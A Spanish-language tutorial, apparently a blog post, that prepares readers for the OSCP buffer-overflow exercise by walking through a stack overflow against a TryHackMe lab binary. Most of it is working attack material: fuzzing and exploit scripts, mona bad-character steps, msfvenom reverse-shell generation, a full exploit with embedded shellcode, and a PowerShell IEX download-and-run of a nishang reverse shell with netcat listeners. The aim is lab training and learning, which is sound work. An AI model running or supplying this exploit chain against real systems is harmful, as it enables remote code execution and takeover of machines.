# ¡Preparación para Buffer Overflow OSCP!

En esta ocasión les traigo una preparación para poder explotar el Buffer Overflow de la OSCP de manera exitosa. Es una máquina donde se pueden conseguir 25 puntos. Para el examen no se requieren conocimientos avanzados de explotación en BoF como por ejemplo Bypass de ASLR, alcanzaría con practicar con las plataformas que adjunto y sus respectivas máquinas.


Maquinas y servicios vulnerables : 

-   SLMail 5.5 
-   Minishare 1.4.1
-   Máquina Brainpan de (Tryhackme - Vulnhub)
-   Gatekeeper (Tryhackme)
-   Buffer Overflow Prep (Tryhackme)
-  Overflow (HackTheBox)

*En este caso para la explicación de la explotación voy a estar usando el binario de Buffer Overflow Prep.*

# Explicación

Antes que nada vamos a hablar un poco sobre el BoF.
El Buffer Overflow es un desbordamiento de la memoria de un programa, es decir, del buffer.
El buffer es una memoria de almacenamiento donde se puede guardar información como puede ser el input de un usuario, es decir podemos tener un software que nos pregunte por ejemplo nuestro nombre, para almacenar el nombre del usuario este software tiene un buffer limitado de 20 bytes. En el caso de que el usuario ponga más caracteres o supere la cantidad de bytes, los caracteres sobrantes empezarían a sobreescribir parte de la memoria del software, causando de esa forma un desbordamiento haciendo que el software se rompa.
La idea de la explotación es poder sobreescribir parte de la memoria para poder colocar código malicioso.


## Requisitos
Para poder explotar BoF necesitamos tener un sistema Windows 7 (x86), este mismo puede estar instalado en VM o VB.
Una vez ya con el Windows 7 instalado debemos descargar programa que pueda Debuggear el software para poder ver a bajo nivel las instrucciones de ejecución que este tiene.
*Recomiendo descargar [immunity debugger](https://www.immunityinc.com/products/debugger/)*
*Recomiendo tener el plugin de Mona instalado, ya que nos va a facilitar algunos pasos : [*Mona*](https://github.com/corelan/mona)

## Empezamos

Para la primer fase primero tenemos que detectar en que punto se genera el desbordamiento del Buffer, abrimos el Debugger y seleccionamos el binario a debuguear y seguidamente ponemos en escucha a netcat por el puerto 1337 para ver que recibimos:

![Immunity Debugger — open oscp.exe](https://i.ibb.co/HHx1Px8/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)![Server](https://i.ibb.co/c24sD4D/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)

Como vemos en la conexión por netcat recibimos un servidor el cual para empezar dice que pongamos el comando "HELP".
Vemos que nos salen varias opciones como *OVERFLOW1 [value]* básicamente nos está pidiendo que pongamos el comando overflow1 y que le pasemos un valor. En mi caso le pase el valor "test" y se ve que se lo tomo bien el servidor, ya que en el output puedo ver "Overflow1 COMPLETE".
Ahora que pasaría si en vez de pasarle como parámetro "test" le pasamos 2000 caracteres, en este caso va a ser el carácter "A". Para eso utilizamos un script en python que empieza a mandarle bytes de forma incremental hasta llegar el punto de que el servidor se satura.


    import socket, time, sys
    ip = "IP MACHINE";  
	port = 1337  
	timeout = 5buffer = []  
	counter = 100  
	while len(buffer) < 30:  
	    buffer.append("A" * counter)  
	    counter += 100for string in buffer:  
	    try:  
	        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
	        s.settimeout(timeout)  
	        connect = s.connect((ip, port))  
	        s.recv(1024)  
	        print("Fuzzing with %s bytes" % len(string))  
	        s.send("OVERFLOW1 " + string + "\r\n")  
	        s.recv(1024)  
	        s.close()  
	    except:  
	        print("Could not connect to " + ip + ":" + str(port))  
	        sys.exit(0)  
	    time.sleep(1)

![Fuzzing](https://i.ibb.co/GdZrhyr/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)


Podemos ver que el programa crashea al momento de llegar a los 2000 Bytes.
Si revisamos el debugger vamos a ver como se crasheo el programa.
**1** - Antes de crashear el programa
**2** - Despues del crasheo


![Before Crash](https://i.ibb.co/vVTwNK5/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)![Server](https://i.ibb.co/PDmGdqy/2.png)


*Una vez que el programa crashea lo volvemos a abrir con el debugger.*

# EIP, ESP y JMP

Antes de continuar tenemos que conocer que son las instrucciones EIP, EBP y ESP, ya que estas instrucciones van a ser las que permitan explotar el Buffer entendiendo como funcionan.
**ESP** (Extended Stack Pointer): Es un puntero al final de la pila. Tras la ejecución de una función, la dirección de retorno se vuelve a cargar en ESP para continuar la ejecución en el mismo punto donde había quedado.
**EBP** (Extended Base Pointer): Según el compilador usado, EBP puede ser utilizado como registro de caracter general o como puntero al marco de la pila.
**EIP** (Extended Instruction Pointer): Contiene la dirección actual de ejecución del programa.

![EIP-ESP-JMP](https://i.ibb.co/YdtNgpH/3.png)

Cada una de estas instrucciones manejan el flujo del programa. A continuación tenemos una imagen que representaría como se iría modificando ese Buffer.
Para no entrar en muchos detalles técnicos lo voy a explicar de una forma sencilla.
Podemos ver los primeros 3 espacios de memoria que contienen "AAAA", esto representaría el espacio de memoria que nos ofrece el programa para poner X cantidad de Bytes / Caracteres.
Si al programa le mandamos más bytes, estos caracteres sobrantes van a empezar a sobreescribir los siguientes espacios de memoria (EBP -8, EBP -4, EBP). Como podemos ver en la imagen del Debugger EBP vale **41414141**, esto esta escrito en Hexadecimal, si buscamos la tabla **ASCII** podemos ver que el carácter "A" corresponderia al numero 41. Entonces en este caso el registro EBP fue remplazado por **"AAAA"**.
En el caso de que se sigan mandando mas Bytes el buffer seguiria creciendo y empezaria a editar otros registros como puede ser el **RET** (Return Address) que en este caso lo vamos a llamar **EIP**.
En el debugger podemos ver que **EIP** vale **41414141** como el EBP esto es porque el EIP se encarga de mantener el flujo del programa y le dice a que dirección tiene que apuntar, como el EIP se sobreescribió en este caso quiere apuntar a "AAAA" pero como no es una dirección válida el programa crashea.


![EIP-ESP-JMP](https://i.ibb.co/tb63NDF/image2.png)


## CAPTURAMOS OFFSET Y BARCHAR

Cuando utilizamos el script hecho en python pudimos ver como al mandar 2000 bytes el programa crashea porque el EIP ya no tiene una dirección válida por donde seguir el flujo del programa, vamos a intentar calcular el Buffer del EIP es decir el espacio de memoria que tiene para poder controlar el flujo.
Para eso vamos a instalar una herramienta llamada **[GDB-PEDA](https://github.com/longld/peda)**

    git clone https://github.com/longld/peda.git ~/peda
	echo "source ~/peda/peda.py" >> ~/.gdbinit

Con Peda lo que vamos a generar un número de caracteres random, estos caracteres tiene que ser los bytes con los que el programa se crasheo + 400. Es decir, mi programa se crashea con 2000 bytes, entonces tengo que crear 2400 caracteres.
Ej-2: Si mi programa se crashea al recibir 800 bytes, voy a generar 1200 caracteres.
Ponemos en la consola gdb para iniciar peda y ponemos el comando *pattern_create bytes+400*:

![pattern](https://i.ibb.co/bRXsQt7/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)


Ya con la cantidad de bytes generados (en mi caso 2400) los copiamos y vamos a crear un script para empezar a generar nuestro exploit.
	
	    import socketip = "IP MACHINE"  
		port = 1337prefix = "OVERFLOW1 "  
		offset = 0  
		overflow = "A" * offset  
		retn = ""  
		padding = ""  
		payload = ""  
		postfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:  
		  s.connect((ip, port))  
		  print("Sending evil buffer...")  
		  s.send(bytes(buffer + "\r\n", "latin-1"))  
		  print("Done!")  
		except:  
		  print("Could not connect.")


Vamos a pegar donde dice "***payload***" los caracteres generados, les tendría que quedar de la siguiente forma:

![pattern](https://i.ibb.co/r6hhdds/Captura-de-pantalla-2022-04-29-203809.png)


Ya con el payload modificado ejecutamos el script para que mande los caracteres al programa y veamos como actúa en el debugger.
Aclaracion: El debugger debe tener el binario corriendo antes de lanzar el exploit.


![pattern](https://i.ibb.co/FVKz9Xt/Captura-de-pantalla-2022-05-03-174558.png)


![pattern](https://i.ibb.co/17SXz52/Captura-de-pantalla-2022-05-03-174558.png)


Como dijimos antes la idea es poder sacar el Offset es decir el tamaño del buffer del EIP, vemos que en este caso después de lanzar el exploit mi EIP tiene un valor de 41744441 (en el caso de ustedes el valor va a ser distinto).
Ya teniendo el valor del EIP a través de gdb podemos sacar el tamaño del EIP.
inicializamos gdb en la consola y ponemos el siguiente comando : pattern_offset 0x[valorEIP].
*Ejemplo de mi caso : pattern_offset 0x41744441*



![pattern](https://i.ibb.co/k4RBpNZ/Captura-de-pantalla-2022-05-03-174558.png)
Podemos ver que el tamaño del EIP es 1978 bytes.


Ya con esta información vamos a modificar el script del exploit.
Cambiamos el valor del **offset** vemos que quedaría en overflow = "A" x offset .
De esta forma ya podemos controlar el valor de **EIP**.
En el caso de **retn** vamos a poner "**BBBB**", este valor va a terminar siendo el de la dirección del EIP en el debugger.
***Aparecería en hexadecimal, es decir 42424242***



![pattern](https://i.ibb.co/WDfzgtd/Captura-de-pantalla-2022-05-03-174558.png)


Ya con todo configurado volvemos a correr el binario en el debugger y lanzamos el exploit.


![pattern](https://i.ibb.co/XZt3pr6/IP.png)

Vemos que el valor del EIP es "42424242" es decir "BBBB", ya pudiendo controlar el flujo del EIP la idea sería poder hacer que redireccione a una dirección maliciosa que se va a almacenar en **ESP** (Controla la pila)
El problema en este punto es que no podemos generar un payload y que lo tome así como así.
Para poder meter codigo malicioso habria que deshacernos de los BADCHARS, los badchars son caracteres que el sistema no logra interpretar y pueden hacer que la ejecución del payload no funcione por lo tanto tenemos que sacar esos caracteres malos.
Por ejemplo, un badchar que viene por defecto es : **\x00**
En el debugger vamos a poner el siguiente comando para asignarle una carpeta de trabajo al plugin de Mona:



    !mona config -set workingfolder c:\mona\%p


![pattern](https://i.ibb.co/Z2yczsh/image2.png)

Ya con el mona preparado le vamos a decir a Mona que excluya el badchar \x00 con el comando : 
`!mona bytearray -b "\x00"`
Ahora tenemos que generar una lista de badchar la cual vamos a poner en el script del exploit para que cuando se mande el exploit le mande los badchar y podamos detectar cuales son los caracteres que no le gustan.
El script para generar badchar es el siguiente (por defecto ya excluye el x00): 

    for x in range(1, 256):  
	    print("\\x" + "{:02x}".format(x), end='')  
    print()

![pattern](https://i.ibb.co/wNyV5wq/image2.png)


Copiamos todos los badchar y los ponemos en el script del exploit en la variable payload : 
![pattern](https://i.ibb.co/MBZNy2b/image2.png)


Lanzamos el exploit y en el debugger con el siguiente comando podemos ver si se detectaron badchars en la ejecución del exploit : 

    !mona compare -f C:\mona\oscp\bytearray.bin -a <addressESP>

![pattern](https://i.ibb.co/jr6d0c8/image2.png)


Como ven en la siguiente imagen dice los badchar que se detectaron : 07 08 2e 2f a0 a1 (marcado en amarillo).
Estos badchar no quiere decir que todos sean malos, sino que puede pasar que al corromperse uno haga que el siguiente lo detecte como badchar por eso mismo no podemos excluir todos de una vez, sino que tenemos que ir uno a uno.

![pattern](https://i.ibb.co/7ky0dDF/image2.png)
Con mona ya excluimos el badchar "\x00", vamos a excluir el siguiente que seria el 07 (\x07)  y tambien lo eliminamos del script del exploit de la variable payload: 

    !mona bytearray -b "\x00\x07"

Volvemos a ejecutar el debugger con el binario y volvemos a lanzar el exploit.
En el debugger volvemos a comparar para ver si siguen habiendo badchar


![pattern](https://i.ibb.co/BnbWqms/image2.png)
Cuando vuelvo a hacer la comparación me dice que todavía siguen habiendo badchars, en este caso el que seguiría por excluir sería el 2e (\x2e).
Lo excluimos de mona y también lo borramos del script del exploit.


    !mona bytearray -b "\x00\x07\x2e"
    
    
Volvemos a debuggear el binario, borramos el badchar del script, lo ejecutamos y volvemos a comparar en el debugger para ver si siguen quedando badchars.

![pattern](https://i.ibb.co/MyHWfWN/image2.png)


Vemos que el siguiente badchar sería el a0 (\xa0), repetimos el proceso de exclusión.
Primero lo excluimos de mona, volvemos a ejecutar el binario en el debugguer, después lo borramos del script del exploit, volvemos a ejecutar el exploit y volvemos a comparar en el debugger:



    !mona bytearray -b "\x00\x07\x2e\xa0"

![pattern](https://i.ibb.co/NN4z5V1/image2.png)


Como podemos ver ya no se detectan badchar, en la comparación no aparece ningún badchar, el status es undifined significa que los badchar que no interpretaba mi binario eran los siguientes : **"\x00\x07\x2e\xa0"**




# Generar payload malicioso para conseguir una reverse shell

A través de mona podemos detectar si el binario tiene algún tipo de protección que tengamos que Bypass, en el caso de la OSCP el binario viene sin protección.
Los tipos de protecciones que hay son: Rebase, SafeSEH, ASLR, NX Compat, OS DLL.
En el caso del binario que estoy explotando vemos que tiene todo en *"False"* por lo tanto no tiene proteccion.
Para ver si nuestro binario está protegido ponemos:



    !mona modules

![pattern](https://i.ibb.co/WK1mdXy/modules.png)


Una vez detectados todos los badchar podemos empezar a generar nuestro código malicioso.
Para hacer esto hay varias formas pero lo mas sencillo es utilizar msfvenom que es una herramienta para poder generar shellcodes.

- LHOST = Nuestra direccion IP
- LPORT = Puerto por el cual se va a generar la conexion inversa
- -b = especificamos los badchar, en mi caso son : “\x00\x07\x2e\xa0”
- EXITFUNC = Función que genera un hilo sobre el proceso, en el caso de que el proceso padre falle quede el hilo para que no se pierda la conexion.

    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b “\x00\x07\x2e\xa0” -f c


![pattern](https://i.ibb.co/jyty8F1/image2.png)


Copiamos todo el shellcode y lo pegamos en el payload del exploit
Les tendria que quedar algo como esto : 

![pattern](https://i.ibb.co/WxG5WWX/image2.png)

# Exploción

Ya tenemos lo que sería nuestra código malicioso que nos va a servir para hacer el desbordamiento del buffer y de esa forma hacer una reverse shell para poder tener control del sistema, el problema es que este shellcode malicioso se está inyectando en el EIP y eso haría que se siga crasheando, lo que necesitamos hacer es hacer que el EIP redireccione al ESP para que sea ejecutado en la pila.
Bien, para eso necesitamos conseguir un registro de tipo jumper, tenemos que encontrar una dirección que pase por el ESP para decirle al EIP que utilice ese jumper point.
Ponemos el siguiente comando para buscar el jumper :
Tienen que reemplazar mis badchar por los de ustedes.



    !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"

![pattern](https://i.ibb.co/NWtfycW/Captura-de-pantalla-2022-05-06-045022.png)


Podemos ver en los resultados que existen varios jumpers point, vamos a elegir el primero que en mi caso es la dirección **625011af**.
Ahora esta dirección la tenemos que colocar en el exploit en la parte de **retn** que si no recuerdan es lo que modifica el EIP.
La dirección la tenemos que poner en hexadecimal y respetando el formato *Little endian* que significa de reversa :
*Normal* : \x62\x50\x11\xaf
*Little endian* : \xaf\x11\x50\x62

Algo que puede surgir es que al momento de lanzar el exploit el EIP vaya directamente al ESP y no lo interprete, para eso vamos a agregar algo llamado **NOPS** (No Operation Code).
Los NOPS son porciones de codigo que se pueden decir que no hacen nada, como bien dice el nombre, no ejecutan ningún tipo de acción, pero le da tiempo al shellcode se decodifique en la pila.
El NOP lo agregamos en la parte de padding. Uno muy conocido es el carácter hexadecimal "\x90".
Lo agregamos en padding y lo multiplicamos por un valor, uno recomendado sería multiplicar este NOP x 16.
El script completo quedaría de la siguiente forma :


Corregido con https://www.corrector.co/es/

    import socket
    
    ip = "10.10.167.216"
    
    port = 1337
    
    prefix = "OVERFLOW1 "
    
    offset = 1978
    
    overflow = "A" * offset
    
    retn = "\xaf\x11\x50\x62"
    
    padding = "\x90" * 16
    
    payload = ("\xba\x73\xec\xe7\xb3\xda\xd7\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
    
    "\x52\x83\xeb\xfc\x31\x53\x0e\x03\x20\xe2\x05\x46\x3a\x12\x4b"
    
    "\xa9\xc2\xe3\x2c\x23\x27\xd2\x6c\x57\x2c\x45\x5d\x13\x60\x6a"
    
    "\x16\x71\x90\xf9\x5a\x5e\x97\x4a\xd0\xb8\x96\x4b\x49\xf8\xb9"
    
    "\xcf\x90\x2d\x19\xf1\x5a\x20\x58\x36\x86\xc9\x08\xef\xcc\x7c"
    
    "\xbc\x84\x99\xbc\x37\xd6\x0c\xc5\xa4\xaf\x2f\xe4\x7b\xbb\x69"
    
    "\x26\x7a\x68\x02\x6f\x64\x6d\x2f\x39\x1f\x45\xdb\xb8\xc9\x97"
    
    "\x24\x16\x34\x18\xd7\x66\x71\x9f\x08\x1d\x8b\xe3\xb5\x26\x48"
    
    "\x99\x61\xa2\x4a\x39\xe1\x14\xb6\xbb\x26\xc2\x3d\xb7\x83\x80"
    
    "\x19\xd4\x12\x44\x12\xe0\x9f\x6b\xf4\x60\xdb\x4f\xd0\x29\xbf"
    
    "\xee\x41\x94\x6e\x0e\x91\x77\xce\xaa\xda\x9a\x1b\xc7\x81\xf2"
    
    "\xe8\xea\x39\x03\x67\x7c\x4a\x31\x28\xd6\xc4\x79\xa1\xf0\x13"
    
    "\x7d\x98\x45\x8b\x80\x23\xb6\x82\x46\x77\xe6\xbc\x6f\xf8\x6d"
    
    "\x3c\x8f\x2d\x21\x6c\x3f\x9e\x82\xdc\xff\x4e\x6b\x36\xf0\xb1"
    
    "\x8b\x39\xda\xd9\x26\xc0\x8d\xef\xa4\xba\xd0\x98\xca\x3a\xfa"
    
    "\x04\x42\xdc\x96\xa4\x02\x77\x0f\x5c\x0f\x03\xae\xa1\x85\x6e"
    
    "\xf0\x2a\x2a\x8f\xbf\xda\x47\x83\x28\x2b\x12\xf9\xff\x34\x88"
    
    "\x95\x9c\xa7\x57\x65\xea\xdb\xcf\x32\xbb\x2a\x06\xd6\x51\x14"
    
    "\xb0\xc4\xab\xc0\xfb\x4c\x70\x31\x05\x4d\xf5\x0d\x21\x5d\xc3"
    
    "\x8e\x6d\x09\x9b\xd8\x3b\xe7\x5d\xb3\x8d\x51\x34\x68\x44\x35"
    
    "\xc1\x42\x57\x43\xce\x8e\x21\xab\x7f\x67\x74\xd4\xb0\xef\x70"
    
    "\xad\xac\x8f\x7f\x64\x75\xaf\x9d\xac\x80\x58\x38\x25\x29\x05"
    
    "\xbb\x90\x6e\x30\x38\x10\x0f\xc7\x20\x51\x0a\x83\xe6\x8a\x66"
    
    "\x9c\x82\xac\xd5\x9d\x86")
    
    postfix = ""
    
    buffer = prefix + overflow + retn + padding + payload + postfix
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
	    s.connect((ip, port))
    
	    print("Sending evil buffer...")
    
	    s.send(bytes(buffer + "\r\n", "latin-1"))
    
	    print("Done!")
	    
    except:
    
	    print("Could not connect.")

# Servidor para establecer la conexión

Lo último que faltaría hacer sería abrir un servidor ya sea con nc, socat, rlwrap, python etc.
Les dejo ejemplos para poner en escucha varios de estos servicios por si alguno les genera algún problema:


Corregido con https://www.corrector.co/es/

    nc -lvp [puertoDeShellCode]
    socat TCP-LISTEN:[puertoDeShellCode] stdout
    rlwrap -lvp [puertoDeShellCode]

En mi caso voy a abrir el servidor con nc, lanzamos el exploit y que surja la **magia**.

![pattern](https://i.ibb.co/KWXQxWK/image2.png)


# Accediendo a traves de una PowerShell
Una de las cosas que podemos hacer es acceder desde una PowerShell para poder tener un poco más de control sobre la máquina ya que tenemos el control total sobre el EIP y ESP podemos variar la forma de acceder y de esa forma tener una alternativa.

Lo primero que vamos a hacer es descargar y configurar una utilidad llamada nishang con los siguientes comandos :
*En el caso del último comando "echo" hay que configurar la IP y el puerto del servidor del atacante por el cual se va a establecer la conexion*


Corregido con https://www.corrector.co/es/


    sudo git clone https://github.com/samratashok/nishang
    cd nishang/Shells/
    echo "Invoke-PowerShellTcp -Reverse -IPAddress ipAtacante -Port 4444" >> Invoke-PowerShellTcp.ps1

 Vamos a generar un nuevo payload con *msfvenom* pero esta vez le vamos a pasar el comando que queremos ejecutar al payload en este caso le voy a decir que quiero que me genere una shell por PowerShell : 

*CMD = Comando a ejecutar a nivel de sistema*

    msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/Invoke-PowerShellTcp.ps1')" EXITFUNC=thread -b “\x00\x07\x2e\xa0” -f c

![pattern](https://i.ibb.co/Np7KCvp/nasm.png)


Copiamos el shellcode generado y lo pegamos en el exploit en la parte de ***"payload"***
Entramos dentro de la carpeta de nishang, despues a la carpeta Shells y nos compartimos un servicio HTTP con python : 

    python -m http.server

A su vez en otra consola vamos a poner a la escucha a netcat por el puerto que pusimos en el "Invoke-PowerShellTcp" en mi caso por el 4444:

    nc -lvp 4444

Ya con el servicio HTTP de python y netcat a la escucha, lanzamos el exploit.
![pattern](https://i.ibb.co/MfL4FLQ/nasm.png)


De esta forma se puede acceder con acceso a una PowerShell.
Puede parecer medio enredado el proceso,, pero después de practicarlo algunas veces sale por instinto propio.

# - Fin / Extra
El BoF es una técnica que solamente se puede aprender si se practica, las plataformas como Tryhackme, HackTheBox, Vulnhub entre otras ofrecen miles de máquinas las cuales son vulnerables al desbordamiento de buffer, puede ser algo abrumador de entender a la primera si sos nuevo en esto, pero es cuestión de práctica.
Espero que te haya podido ser útil para entender más como funciona el BoF y en el mejor de los casos que hayas podido explotar el binario.
Cualquier tipo de consulta / ayuda no duden en contactarme por mis redes como **[Linkedin](https://www.linkedin.com/in/beta-casanova/)**
Si te interesa tener clases personalizadas en vivo no dudes en contactarme.
Como extra quisiera dejar una alternativa a los NOPS, en el caso de no querer usarlos hay una técnica donde básicamente se hace un desplazamiento del ESP (de la pila).
Cuando EIP apunta al ESP que es donde esta nuestro shellcode, con el desplazamiento movemos el ESP una X cantidad de lugares y antes de que se ejecute nuestro shellcode va a ejecutar una serie de instrucciones que no tienen que ver con nuestras instrucciones, haciendo que una vez que estas instrucciones se ejecuten empiece a ejecutarse nuestro shellcode.
Para hacer esto vamos a usar nams_shell lo podemos descargar desde este repositorio:  [namsoshell](https://github.com/fishstiqz/nasmshell)
lo ejecutamos con Python y escribimos:

sub esp,0x10
*En este caso estamos haciendo un desplazamiento de la pila de 10 unidades*
Esto nos va a devolver un resultado que lo tenemos que pasar a hexadecimal y lo colocamos en el exploit en la parte de **padding** (donde previamente estaban los NOPS) :
*Normal : 83EC10
Hexadecimal : \x83\xEC\x10*



 ![pattern]( https://i.ibb.co/RjZ2h45/nasm.png)

